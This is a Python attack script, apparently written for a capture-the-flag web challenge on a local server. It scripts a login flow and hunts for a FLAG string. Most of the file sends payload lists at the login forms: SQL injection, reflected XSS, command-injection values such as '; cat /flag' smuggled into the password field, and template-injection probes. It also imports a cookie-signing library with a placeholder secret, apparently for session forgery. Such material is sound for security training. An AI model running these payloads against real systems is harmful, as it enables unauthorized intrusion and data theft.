import base64
import requests
import json
from itsdangerous import URLSafeTimedSerializer

# Target information
base_url = "http://127.0.0.1:32948"
secret_key = "your_secret_key"
original_cookie = "eyJ1c2VyX2lkIjoiMTAwMzIifQ.ac1HnA.FebyScjcMvCp0EyankY0kHuCbcA"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Let's try the complete login flow for user 'test'
print("[+] Complete login flow as user 'test'...")

# Step 1: Post username 'test'
resp1 = requests.post(base_url + "/", data={"username": "test"}, headers=headers, allow_redirects=False)
print(f"Step 1: {resp1.status_code}")
if resp1.status_code == 302:
    location = resp1.headers.get('location', '')
    print(f"  Redirect to: {location}")
    
    # Step 2: Get the password page
    resp2 = requests.get(base_url + location, headers=headers, allow_redirects=False)
    print(f"Step 2: {resp2.status_code}")
    
    # Extract user_id from the page
    import re
    user_id_match = re.search(r'name="user_id"[^>]*value="([^"]+)"', resp2.text)
    username_match = re.search(r'name="username"[^>]*value="([^"]+)"', resp2.text)
    
    if user_id_match:
        user_id = user_id_match.group(1)
        username = username_match.group(1) if username_match else "test"
        print(f"  User ID: {user_id}")
        print(f"  Username: {username}")
        
        # Step 3: Post password
        resp3_data = {
            "username": username,
            "user_id": user_id,
            "password": "test"
        }
        resp3 = requests.post(base_url + location, data=resp3_data, headers=headers, allow_redirects=False)
        print(f"Step 3: {resp3.status_code}")
        
        if resp3.status_code == 302:
            final_loc = resp3.headers.get('location', '')
            print(f"  Final redirect: {final_loc}")
            
            # Check for set-cookie
            if 'set-cookie' in resp3.headers:
                print(f"  Set-Cookie: {resp3.headers['set-cookie']}")
            
            # Follow redirect
            resp4 = requests.get(base_url + final_loc, headers=headers, cookies=resp3.cookies, allow_redirects=True)
            print(f"Final page: {resp4.status_code} at {resp4.url}")
            
            # Search for flag
            flags = re.findall(r'FLAG\{[^}]+\}', resp4.text)
            if flags:
                print(f"  [!] FLAG: {flags}")
            
            print(f"  Content:\n{resp4.text}")

# Try SQL injection in the login flow
print("\n[+] Testing SQL injection in login forms...")
# Test on username field
sqli_tests = [
    "test' OR '1'='1",
    "test' OR '1'='1'--",
    "admin'--",
    "' OR 1=1--",
    "test' AND 1=1--",
]
for sqli in sqli_tests:
    resp = requests.post(base_url + "/", data={"username": sqli}, headers=headers, allow_redirects=False)
    if resp.status_code == 302:
        print(f"  SQLi '{sqli[:20]}...' -> 302 redirect (possible success)")
    elif "alert" in resp.text.lower() or "error" in resp.text.lower():
        print(f"  SQLi '{sqli[:20]}...' -> Error response")
    else:
        print(f"  SQLi '{sqli[:20]}...' -> {resp.status_code}")

# Try XSS in forms
print("\n[+] Testing XSS in forms...")
xss_tests = [
    '<script>alert(1)</script>',
    'test<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
]
for xss in xss_tests:
    resp = requests.post(base_url + "/", data={"username": xss}, headers=headers, allow_redirects=False)
    if xss in resp.text:
        print(f"  XSS '{xss[:30]}...' -> Reflected!")

# Try command injection in password
print("\n[+] Testing command injection...")
cmd_tests = [
    '; cat /flag',
    '| cat /flag',
    '$(cat /flag)',
    '`cat /flag`',
    '; ls',
    '| ls',
]
for cmd in cmd_tests:
    # Get to password page
    resp = requests.post(base_url + "/", data={"username": "test"}, headers=headers, allow_redirects=False)
    if resp.status_code == 302:
        password_url = base_url + resp.headers.get('location', '')
        # Submit password with command injection
        resp2 = requests.post(password_url, data={
            "username": "test",
            "user_id": "10032",
            "password": cmd
        }, headers=headers)
        if resp2.status_code == 500 or "flag" in resp2.text.lower():
            print(f"  Cmd injection '{cmd}' -> Interesting response")
            print(f"  Content: {resp2.text[:500]}")

# Check for server-side template injection (SSTI)
print("\n[+] Testing for SSTI...")
ssti_tests = [
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "{{config}}",
    "{{self}}",
]
for ssti in ssti_tests:
    resp = requests.post(base_url + "/", data={"username": ssti}, headers=headers, allow_redirects=False)
    if "49" in resp.text or "config" in resp.text.lower():
        print(f"  SSTI '{ssti}' -> Possible injection!")
    elif ssti in resp.text:
        print(f"  SSTI '{ssti}' -> Reflected")

# Try to access /robots.txt, /sitemap.xml
print("\n[+] Checking standard discovery files...")
standard_files = ["/robots.txt", "/sitemap.xml", "/.htaccess", "/crossdomain.xml", "/security.txt"]
for sf in standard_files:
    url = base_url + sf
    r = requests.get(url, headers=headers, allow_redirects=False)
    if r.status_code == 200:
        print(f"  {sf}: FOUND")
        if len(r.text) < 500:
            print(f"    Content: {r.text}")

# Try POST to logout and then explore
print("\n[+] Exploring POST logout...")
resp_logout = requests.post(base_url + "/logout", headers=headers, cookies={"session": original_cookie}, allow_redirects=False)
print(f"Logout: {resp_logout.status_code}")
